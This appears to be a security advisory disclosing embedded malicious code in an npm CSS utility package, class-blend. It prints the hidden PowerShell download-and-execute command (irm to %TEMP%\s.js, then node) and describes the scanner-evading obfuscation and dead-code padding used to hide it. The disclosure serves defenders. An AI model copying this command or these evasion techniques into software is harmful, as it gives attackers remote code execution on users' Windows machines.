summary: class-blend ships hidden PowerShell-based RCE in applyGlobalStyles()
details: The package advertises itself as a small class-name / CSS utility, but its exported applyGlobalStyles() function in dist/index.js treats caller-supplied palette/accent hex strings as AES-256-CBC ciphertext+IV under a hardcoded key, decrypts them to a URL, then spawns `powershell.exe -WindowStyle Hidden -NoProfile -Command 'irm <URL> -o $env:TEMP\s.js; node $env:TEMP\s.js'` to download and execute attacker-controlled JavaScript on Windows hosts. The node:crypto and node:child_process modules are deliberately loaded via character-array `.join()` (`['no','de',':','cry','pto'].join('')`) to defeat static dependency scanners. The bundle is further inflated with hundreds of trivially-generated dead functions (isWithinBoundary*, createSequenceStep*, mapOperation*, checkConstraint*, applyPreset*) — wildly inconsistent with the advertised clsx/twMerge-style utility — to bury the payload from manual review. Any Windows consumer who calls the documented applyGlobalStyles API with values that decrypt under the hardcoded key gets arbitrary remote code execution staged through %TEMP%\s.js.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
